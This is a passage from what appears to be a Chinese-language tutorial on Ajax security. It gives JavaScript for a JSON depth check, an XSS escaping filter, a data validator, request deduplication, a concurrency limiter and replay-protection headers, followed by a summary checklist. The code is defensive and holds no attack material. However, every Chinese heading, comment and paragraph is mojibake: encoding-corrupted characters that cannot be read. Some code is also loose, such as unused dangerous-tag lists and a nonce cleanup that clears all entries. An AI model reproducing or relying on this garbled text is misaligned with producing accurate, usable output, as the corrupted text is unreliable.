function validateJsonStructure(data) {
    // é˜²æ­¢è¿‡æ·±åµŒå¥—ï¼ˆé¿å…å †æ ˆæº¢å‡ºï¼‰
    function getDepth(obj, depth = 0) {
        if (depth > 100) return depth;  // æœ€å¤§æ·±åº¦é™åˆ¶
        
        if (typeof obj === 'object' && obj !== null) {
            let maxChildDepth = depth;
            for (const key in obj) {
                const childDepth = getDepth(obj[key], depth + 1);
                maxChildDepth = Math.max(maxChildDepth, childDepth);
            }
            return maxChildDepth;
        }
        return depth;
    }
    
    return getDepth(data) <= 100;
}
```

### 6.2 XSSè¿‡æ»¤å¤„ç†


**å“åº”æ•°æ®çš„XSSé˜²æŠ¤**ï¼š

```javascript
// ğŸ§¹ XSSè¿‡æ»¤å™¨
class XSSFilter {
    constructor() {
        // å±é™©HTMLæ ‡ç­¾
        this.dangerousTags = [
            'script', 'iframe', 'object', 'embed', 
            'form', 'input', 'textarea', 'button'
        ];
        
        // å±é™©å±æ€§
        this.dangerousAttrs = [
            'onclick', 'onload', 'onerror', 'onmouseover',
            'href', 'src', 'action', 'formaction'
        ];
    }
    
    // è¿‡æ»¤å­—ç¬¦ä¸²ä¸­çš„XSS
    filterString(str) {
        if (typeof str !== 'string') return str;
        
        return str
            .replace(/</g, '&lt;')      // è½¬ä¹‰å°äºå·
            .replace(/>/g, '&gt;')      // è½¬ä¹‰å¤§äºå·
            .replace(/"/g, '&quot;')    // è½¬ä¹‰åŒå¼•å·
            .replace(/'/g, '&#x27;')    // è½¬ä¹‰å•å¼•å·
            .replace(/\//g, '&#x2F;');  // è½¬ä¹‰æ–œæ 
    }
    
    // é€’å½’è¿‡æ»¤å¯¹è±¡
    filterObject(obj) {
        if (typeof obj === 'string') {
            return this.filterString(obj);
        }
        
        if (Array.isArray(obj)) {
            return obj.map(item => this.filterObject(item));
        }
        
        if (typeof obj === 'object' && obj !== null) {
            const filtered = {};
            for (const [key, value] of Object.entries(obj)) {
                // è¿‡æ»¤é”®åå’Œå€¼
                const safeKey = this.filterString(key);
                filtered[safeKey] = this.filterObject(value);
            }
            return filtered;
        }
        
        return obj;
    }
    
    // å®‰å…¨æ˜¾ç¤ºHTMLå†…å®¹
    safeHTML(html) {
        // åˆ›å»ºä¸´æ—¶DOMå…ƒç´ 
        const temp = document.createElement('div');
        temp.textContent = html;  // è‡ªåŠ¨è½¬ä¹‰
        return temp.innerHTML;
    }
}

const xssFilter = new XSSFilter();

// ä½¿ç”¨ç¤ºä¾‹
function handleApiResponse(response) {
    const safeData = xssFilter.filterObject(response);
    
    // å®‰å…¨åœ°æ˜¾ç¤ºæ•°æ®
    document.getElementById('content').textContent = safeData.message;
    // è€Œä¸æ˜¯ï¼šdocument.getElementById('content').innerHTML = response.message;
}
```

### 6.3 æ•°æ®ç±»å‹éªŒè¯


**ä¸¥æ ¼çš„æ•°æ®éªŒè¯æœºåˆ¶**ï¼š

```javascript
// ğŸ“‹ æ•°æ®éªŒè¯å™¨
class DataValidator {
    // éªŒè¯ç”¨æˆ·ä¿¡æ¯
    validateUser(userData) {
        const schema = {
            id: { type: 'number', required: true, min: 1 },
            name: { type: 'string', required: true, maxLength: 50 },
            email: { type: 'email', required: true },
            age: { type: 'number', min: 0, max: 150 },
            roles: { type: 'array', itemType: 'string' }
        };
        
        return this.validate(userData, schema);
    }
    
    // é€šç”¨éªŒè¯å‡½æ•°
    validate(data, schema) {
        const errors = [];
        
        for (const [field, rules] of Object.entries(schema)) {
            const value = data[field];
            
            // å¿…å¡«æ£€æŸ¥
            if (rules.required && (value === undefined || value === null)) {
                errors.push(`${field}æ˜¯å¿…å¡«å­—æ®µ`);
                continue;
            }
            
            // è·³è¿‡å¯é€‰çš„ç©ºå€¼
            if (value === undefined || value === null) continue;
            
            // ç±»å‹æ£€æŸ¥
            if (!this.checkType(value, rules.type)) {
                errors.push(`${field}ç±»å‹ä¸æ­£ç¡®ï¼ŒæœŸæœ›${rules.type}`);
                continue;
            }
            
            // å…¶ä»–è§„åˆ™æ£€æŸ¥
            if (rules.min !== undefined && value < rules.min) {
                errors.push(`${field}ä¸èƒ½å°äº${rules.min}`);
            }
            
            if (rules.max !== undefined && value > rules.max) {
                errors.push(`${field}ä¸èƒ½å¤§äº${rules.max}`);
            }
            
            if (rules.maxLength && value.length > rules.maxLength) {
                errors.push(`${field}é•¿åº¦ä¸èƒ½è¶…è¿‡${rules.maxLength}`);
            }
        }
        
        return {
            isValid: errors.length === 0,
            errors: errors,
            data: errors.length === 0 ? data : null
        };
    }
    
    // ç±»å‹æ£€æŸ¥
    checkType(value, expectedType) {
        switch (expectedType) {
            case 'string':
                return typeof value === 'string';
            case 'number':
                return typeof value === 'number' && !isNaN(value);
            case 'boolean':
                return typeof value === 'boolean';
            case 'array':
                return Array.isArray(value);
            case 'email':
                return typeof value === 'string' && 
                       /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
            default:
                return true;
        }
    }
}

// ä½¿ç”¨ç¤ºä¾‹
const validator = new DataValidator();

function handleUserData(response) {
    const result = validator.validateUser(response.data);
    
    if (result.isValid) {
        // æ•°æ®éªŒè¯é€šè¿‡ï¼Œå®‰å…¨ä½¿ç”¨
        displayUser(result.data);
    } else {
        // æ•°æ®éªŒè¯å¤±è´¥ï¼Œè®°å½•é”™è¯¯
        console.error('æ•°æ®éªŒè¯å¤±è´¥:', result.errors);
        showError('æ¥æ”¶åˆ°çš„æ•°æ®æ ¼å¼ä¸æ­£ç¡®');
    }
}
```

---

## 7. ğŸ›¡ï¸ å¼‚æ­¥è¯·æ±‚é˜²æŠ¤ç­–ç•¥


### 7.1 è¯·æ±‚å»é‡æœºåˆ¶


**ä¸ºä»€ä¹ˆéœ€è¦è¯·æ±‚å»é‡ï¼Ÿ**

> ğŸ’¡ **é—®é¢˜åœºæ™¯**ï¼šç”¨æˆ·å¿«é€Ÿç‚¹å‡»æŒ‰é’®ï¼Œå‘é€å¤šä¸ªç›¸åŒè¯·æ±‚ï¼Œå¯èƒ½å¯¼è‡´æ•°æ®æ··ä¹±æˆ–æœåŠ¡å™¨å‹åŠ›

```javascript
// ğŸ”„ æ™ºèƒ½è¯·æ±‚å»é‡å™¨
class RequestDeduplicator {
    constructor() {
        this.pendingRequests = new Map();  // å­˜å‚¨è¿›è¡Œä¸­çš„è¯·æ±‚
    }
    
    // ç”Ÿæˆè¯·æ±‚çš„å”¯ä¸€æ ‡è¯†
    generateKey(url, method, body) {
        const bodyStr = body ? JSON.stringify(body) : '';
        return `${method}:${url}:${bodyStr}`;
    }
    
    // å‘èµ·å»é‡è¯·æ±‚
    async request(url, options = {}) {
        const method = options.method || 'GET';
        const key = this.generateKey(url, method, options.body);
        
        // å¦‚æœç›¸åŒè¯·æ±‚æ­£åœ¨è¿›è¡Œä¸­ï¼Œè¿”å›ç›¸åŒçš„Promise
        if (this.pendingRequests.has(key)) {
            console.log('è¯·æ±‚å»é‡:', key);
            return this.pendingRequests.get(key);
        }
        
        // åˆ›å»ºæ–°è¯·æ±‚
        const requestPromise = this.makeRequest(url, options);
        
        // å­˜å‚¨åˆ°å¾…å¤„ç†åˆ—è¡¨
        this.pendingRequests.set(key, requestPromise);
        
        // è¯·æ±‚å®Œæˆåæ¸…ç†
        requestPromise.finally(() => {
            this.pendingRequests.delete(key);
        });
        
        return requestPromise;
    }
    
    async makeRequest(url, options) {
        try {
            const response = await fetch(url, options);
            if (!response.ok) {
                throw new Error(`HTTP ${response.status}`);
            }
            return await response.json();
        } catch (error) {
            console.error('è¯·æ±‚å¤±è´¥:', error);
            throw error;
        }
    }
    
    // æ¸…é™¤æ‰€æœ‰å¾…å¤„ç†è¯·æ±‚
    clear() {
        this.pendingRequests.clear();
    }
}

const deduplicator = new RequestDeduplicator();

// ä½¿ç”¨ç¤ºä¾‹
async function saveUserProfile(userData) {
    try {
        const result = await deduplicator.request('/api/user/profile', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(userData)
        });
        
        console.log('ä¿å­˜æˆåŠŸ:', result);
        return result;
    } catch (error) {
        console.error('ä¿å­˜å¤±è´¥:', error);
        throw error;
    }
}
```

### 7.2 å¹¶å‘æ§åˆ¶


**æ§åˆ¶åŒæ—¶è¿›è¡Œçš„è¯·æ±‚æ•°é‡**ï¼š

```javascript
// ğŸš¦ å¹¶å‘æ§åˆ¶å™¨
class ConcurrencyController {
    constructor(maxConcurrent = 5) {
        this.maxConcurrent = maxConcurrent;  // æœ€å¤§å¹¶å‘æ•°
        this.running = 0;                    // å½“å‰è¿è¡Œæ•°
        this.queue = [];                     // ç­‰å¾…é˜Ÿåˆ—
    }
    
    // æ·»åŠ è¯·æ±‚åˆ°é˜Ÿåˆ—
    async execute(requestFn) {
        return new Promise((resolve, reject) => {
            this.queue.push({
                requestFn,
                resolve,
                reject
            });
            
            this.processQueue();
        });
    }
    
    // å¤„ç†é˜Ÿåˆ—
    async processQueue() {
        // å¦‚æœè¾¾åˆ°æœ€å¤§å¹¶å‘æ•°ï¼Œç­‰å¾…
        if (this.running >= this.maxConcurrent || this.queue.length === 0) {
            return;
        }
        
        const { requestFn, resolve, reject } = this.queue.shift();
        this.running++;
        
        try {
            const result = await requestFn();
            resolve(result);
        } catch (error) {
            reject(error);
        } finally {
            this.running--;
            this.processQueue();  // å¤„ç†ä¸‹ä¸€ä¸ª
        }
    }
    
    // è·å–çŠ¶æ€ä¿¡æ¯
    getStatus() {
        return {
            running: this.running,
            queued: this.queue.length,
            maxConcurrent: this.maxConcurrent
        };
    }
}

const concurrencyController = new ConcurrencyController(3);  // æœ€å¤š3ä¸ªå¹¶å‘

// ä½¿ç”¨ç¤ºä¾‹
async function batchUploadFiles(files) {
    const uploadPromises = files.map(file => 
        concurrencyController.execute(() => uploadFile(file))
    );
    
    try {
        const results = await Promise.all(uploadPromises);
        console.log('æ‰€æœ‰æ–‡ä»¶ä¸Šä¼ å®Œæˆ:', results);
        return results;
    } catch (error) {
        console.error('æ‰¹é‡ä¸Šä¼ å¤±è´¥:', error);
        throw error;
    }
}

async function uploadFile(file) {
    const formData = new FormData();
    formData.append('file', file);
    
    const response = await fetch('/api/upload', {
        method: 'POST',
        body: formData
    });
    
    return response.json();
}
```

### 7.3 é‡æ”¾æ”»å‡»é˜²æŠ¤


**ä»€ä¹ˆæ˜¯é‡æ”¾æ”»å‡»ï¼Ÿ**

> âš ï¸ **æ”»å‡»åŸç†**ï¼šæ”»å‡»è€…æˆªè·å¹¶é‡å¤å‘é€ä¹‹å‰çš„æœ‰æ•ˆè¯·æ±‚ï¼Œå¯èƒ½å¯¼è‡´é‡å¤æ“ä½œ

```javascript
// ğŸ” é‡æ”¾æ”»å‡»é˜²æŠ¤
class ReplayProtection {
    constructor() {
        this.usedNonces = new Set();          // å·²ä½¿ç”¨çš„éšæœºæ•°
        this.maxNonceAge = 5 * 60 * 1000;     // 5åˆ†é’Ÿæœ‰æ•ˆæœŸ
        this.cleanupInterval = 60 * 1000;     // 1åˆ†é’Ÿæ¸…ç†ä¸€æ¬¡
        
        // å®šæœŸæ¸…ç†è¿‡æœŸçš„nonce
        setInterval(() => this.cleanupExpiredNonces(), this.cleanupInterval);
    }
    
    // ç”Ÿæˆé˜²é‡æ”¾çš„è¯·æ±‚
    async createSecureRequest(url, options = {}) {
        const timestamp = Date.now();
        const nonce = this.generateNonce();
        
        // æ·»åŠ é˜²é‡æ”¾å¤´
        const headers = {
            ...options.headers,
            'X-Timestamp': timestamp.toString(),
            'X-Nonce': nonce,
            'X-Request-ID': this.generateRequestId()
        };
        
        return {
            ...options,
            headers
        };
    }
    
    // éªŒè¯è¯·æ±‚æ˜¯å¦ä¸ºé‡æ”¾
    validateRequest(headers) {
        const timestamp = parseInt(headers['X-Timestamp']);
        const nonce = headers['X-Nonce'];
        const requestId = headers['X-Request-ID'];
        
        // æ£€æŸ¥æ—¶é—´æˆ³
        const now = Date.now();
        if (!timestamp || Math.abs(now - timestamp) > this.maxNonceAge) {
            return { valid: false, reason: 'è¯·æ±‚æ—¶é—´æˆ³æ— æ•ˆ' };
        }
        
        // æ£€æŸ¥nonceæ˜¯å¦å·²ä½¿ç”¨
        if (!nonce || this.usedNonces.has(nonce)) {
            return { valid: false, reason: 'è¯·æ±‚å·²è¢«ä½¿ç”¨' };
        }
        
        // æ£€æŸ¥è¯·æ±‚IDæ ¼å¼
        if (!requestId || !this.isValidRequestId(requestId)) {
            return { valid: false, reason: 'è¯·æ±‚IDæ— æ•ˆ' };
        }
        
        // è®°å½•å·²ä½¿ç”¨çš„nonce
        this.usedNonces.add(nonce);
        
        return { valid: true };
    }
    
    // ç”Ÿæˆéšæœºæ•°
    generateNonce() {
        const array = new Uint8Array(16);
        crypto.getRandomValues(array);
        return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
    }
    
    // ç”Ÿæˆè¯·æ±‚ID
    generateRequestId() {
        return `req_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    }
    
    // éªŒè¯è¯·æ±‚IDæ ¼å¼
    isValidRequestId(requestId) {
        return /^req_\d+_[a-z0-9]{9}$/.test(requestId);
    }
    
    // æ¸…ç†è¿‡æœŸçš„nonce
    cleanupExpiredNonces() {
        // å®é™…åº”ç”¨ä¸­å¯ä»¥ç»´æŠ¤nonceçš„æ—¶é—´æˆ³ï¼Œè¿™é‡Œç®€åŒ–å¤„ç†
        if (this.usedNonces.size > 10000) {
            this.usedNonces.clear();
        }
    }
}

const replayProtection = new ReplayProtection();

// å®‰å…¨çš„æ”¯ä»˜è¯·æ±‚ç¤ºä¾‹
async function securePayment(paymentData) {
    try {
        // åˆ›å»ºé˜²é‡æ”¾çš„è¯·æ±‚é€‰é¡¹
        const secureOptions = await replayProtection.createSecureRequest('/api/payment', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${getToken()}`
            },
            body: JSON.stringify(paymentData)
        });
        
        const response = await fetch('/api/payment', secureOptions);
        
        if (!response.ok) {
            throw new Error(`æ”¯ä»˜å¤±è´¥: ${response.status}`);
        }
        
        return await response.json();
        
    } catch (error) {
        console.error('æ”¯ä»˜è¯·æ±‚å¤±è´¥:', error);
        throw error;
    }
}
```

---

## 8. ğŸ“‹ æ ¸å¿ƒè¦ç‚¹æ€»ç»“


### 8.1 å¿…é¡»æŒæ¡çš„å®‰å…¨åŸºç¡€


```
ğŸ” Ajaxå®‰å…¨ä¸‰è¦ç´ ï¼š
â€¢ èº«ä»½éªŒè¯ï¼šç¡®ä¿è¯·æ±‚æ¥è‡ªåˆæ³•ç”¨æˆ·
â€¢ æ•°æ®ä¿æŠ¤ï¼šé˜²æ­¢æ•°æ®è¢«ç¯¡æ”¹æˆ–æ³„éœ²  
â€¢ è®¿é—®æ§åˆ¶ï¼šé™åˆ¶ç”¨æˆ·èƒ½å¤Ÿè®¿é—®çš„èµ„æº

ğŸ›¡ï¸ æ ¸å¿ƒé˜²æŠ¤åŸåˆ™ï¼š
â€¢ æœ€å°æƒé™ï¼šåªç»™å¿…è¦çš„è®¿é—®æƒé™
â€¢ æ·±åº¦é˜²å¾¡ï¼šå¤šå±‚å®‰å…¨æªæ–½
â€¢ å®‰å…¨é»˜è®¤ï¼šé»˜è®¤é…ç½®å°±æ˜¯å®‰å…¨çš„
â€¢ å¿«é€Ÿå¤±è´¥ï¼šå‘ç°é—®é¢˜ç«‹å³åœæ­¢
```

### 8.2 å…³é”®å®‰å…¨é…ç½®


**ğŸ“‹ å®‰å…¨æ£€æŸ¥æ¸…å•**ï¼š

- âœ… **åŒæºç­–ç•¥**ï¼šç†è§£å¹¶æ­£ç¡®é…ç½®è·¨åŸŸè®¿é—®
- âœ… **å‡­è¯ç®¡ç†**ï¼šå®‰å…¨ä¼ é€’å’Œå­˜å‚¨è®¤è¯ä¿¡æ¯
- âœ… **æ•°æ®éªŒè¯**ï¼šä¸¥æ ¼éªŒè¯æ‰€æœ‰è¾“å…¥å’Œè¾“å‡ºæ•°æ®
- âœ… **é”™è¯¯å¤„ç†**ï¼šå®‰å…¨åœ°å¤„ç†å’Œæ˜¾ç¤ºé”™è¯¯ä¿¡æ¯
- âœ… **è¶…æ—¶æ§åˆ¶**ï¼šè®¾ç½®åˆç†çš„è¯·æ±‚è¶…æ—¶æ—¶é—´
- âœ… **é‡è¯•æœºåˆ¶**ï¼šæ™ºèƒ½é‡è¯•ï¼Œé¿å…è¿‡åº¦é‡è¯•
- âœ… **å¹¶å‘æ§åˆ¶**ï¼šé™åˆ¶åŒæ—¶è¿›è¡Œçš„è¯·æ±‚æ•°é‡

### 8.3 å¸¸è§å®‰å…¨è¯¯åŒº


```
âŒ é”™è¯¯åšæ³• vs âœ… æ­£ç¡®åšæ³•ï¼š

1. å‡­è¯å¤„ç†ï¼š
âŒ åœ¨URLä¸­ä¼ é€’æ•æ„Ÿä¿¡æ¯
âœ… ä½¿ç”¨Authorizationå¤´ä¼ é€’Token

2. é”™è¯¯å¤„ç†ï¼š
âŒ ç›´æ¥æ˜¾ç¤ºæœåŠ¡å™¨é”™è¯¯ä¿¡æ¯
âœ… æ˜¾ç¤ºç”¨æˆ·å‹å¥½çš„é”™è¯¯ä¿¡æ¯

3. æ•°æ®éªŒè¯ï¼š
âŒ åªåœ¨å‰ç«¯éªŒè¯æ•°æ®
âœ… å‰åç«¯éƒ½è¿›è¡Œæ•°æ®éªŒè¯

4. è·¨åŸŸå¤„ç†ï¼š
âŒ ä½¿ç”¨ä¸å®‰å…¨çš„JSONP
âœ… ä½¿ç”¨CORSæˆ–ä»£ç†æœåŠ¡å™¨

5. ç¼“å­˜ç­–ç•¥ï¼š
âŒ ç¼“å­˜æ•æ„Ÿæ•°æ®
âœ… æ•æ„Ÿæ•°æ®è®¾ç½®no-cache
```

### 8.4 å®æˆ˜åº”ç”¨å»ºè®®


**ğŸ¯ ä¸åŒåœºæ™¯çš„å®‰å…¨ç­–ç•¥**ï¼š

```
å…¬å¼€APIè°ƒç”¨ï¼š
â€¢ ä½¿ç”¨GETè¯·æ±‚
â€¢ ä¸å‘é€å‡­è¯ä¿¡æ¯
â€¢ è®¾ç½®è¾ƒçŸ­è¶…æ—¶æ—¶é—´
â€¢ å®æ–½é€Ÿç‡é™åˆ¶

ç”¨æˆ·è®¤è¯è¯·æ±‚ï¼š
â€¢ ä½¿ç”¨HTTPS
â€¢ å®æ–½CSRFä¿æŠ¤
â€¢ éªŒè¯å“åº”çŠ¶æ€
â€¢ å®‰å…¨å­˜å‚¨Token

æ•æ„Ÿæ•°æ®æ“ä½œï¼š
â€¢ è¦æ±‚äºŒæ¬¡ç¡®è®¤
â€¢ å®æ–½é‡æ”¾ä¿æŠ¤
â€¢ è¯¦ç»†è®°å½•æ—¥å¿—
â€¢ å®æ—¶ç›‘æ§å¼‚å¸¸

æ–‡ä»¶ä¸Šä¼ æ“ä½œï¼š
â€¢ ä¸¥æ ¼æ–‡ä»¶ç±»å‹æ£€æŸ¥
â€¢ é™åˆ¶æ–‡ä»¶å¤§å°
â€¢ ç—…æ¯’æ‰«æ
â€¢ å®‰å…¨å­˜å‚¨è·¯å¾„
```

### 8.5 å®‰å…¨å¼€å‘æœ€ä½³å®è·µ


> ğŸ’¡ **æ ¸å¿ƒç†å¿µ**ï¼šå®‰å…¨ä¸æ˜¯ä¸€æ¬¡æ€§å·¥ä½œï¼Œè€Œæ˜¯æŒç»­çš„è¿‡ç¨‹

**ğŸ”„ å®‰å…¨å¼€å‘æµç¨‹**ï¼š
1. **è®¾è®¡é˜¶æ®µ**ï¼šè€ƒè™‘å®‰å…¨éœ€æ±‚
2. **å¼€å‘é˜¶æ®µ**ï¼šéµå¾ªå®‰å…¨ç¼–ç è§„èŒƒ
3. **æµ‹è¯•é˜¶æ®µ**ï¼šè¿›è¡Œå®‰å…¨æµ‹è¯•
4. **éƒ¨ç½²é˜¶æ®µ**ï¼šå®‰å…¨é…ç½®æ£€æŸ¥
5. **è¿ç»´é˜¶æ®µ**ï¼šæŒç»­ç›‘æ§å’Œæ›´æ–°

**ğŸ“š å­¦ä¹ å»ºè®®**ï¼š
- å®šæœŸå…³æ³¨å®‰å…¨æ¼æ´æŠ¥å‘Š
- å­¦ä¹ æœ€æ–°çš„å®‰å…¨é˜²æŠ¤æŠ€æœ¯
- å‚ä¸å®‰å…¨ç¤¾åŒºè®¨è®º
- è¿›è¡Œå®é™…çš„å®‰å…¨æµ‹è¯•

**æ ¸å¿ƒè®°å¿†**ï¼š
- Ajaxå®‰å…¨çš„æœ¬è´¨æ˜¯ç¡®ä¿å¼‚æ­¥é€šä¿¡çš„å¯ä¿¡
- æ¯ä¸ªè¯·æ±‚éƒ½è¦ç»è¿‡èº«ä»½éªŒè¯å’Œæ•°æ®éªŒè¯
- å®‰å…¨é…ç½®è¦è€ƒè™‘å¤šç§æ”»å‡»åœºæ™¯
- ç”¨æˆ·ä½“éªŒå’Œå®‰å…¨æ€§éœ€è¦å¹³è¡¡è€ƒè™‘